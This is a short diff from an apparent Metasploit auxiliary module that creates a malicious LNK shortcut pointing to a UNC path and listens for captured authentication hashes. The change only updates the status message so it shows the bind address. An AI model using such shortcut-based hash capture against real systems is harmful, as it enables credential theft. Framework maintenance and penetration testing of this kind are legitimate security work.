@@ -161,7 +161,7 @@ class MetasploitModule < Msf::Auxiliary
     lnk_data = ms_shllink(unc_path, app_name)
     file_create(lnk_data)
     print_good("LNK file created: #{datastore['FILENAME']}")
-    print_status("Listening for hashes on #{srvhost}:#{datastore['SRVPORT']}")
+    print_status("Listening for hashes on #{Rex::Socket.to_authority(bindhost, bindport)}")
     stime = Time.now.to_f
     timeout = datastore['ListenerTimeout'].to_i
     loop do
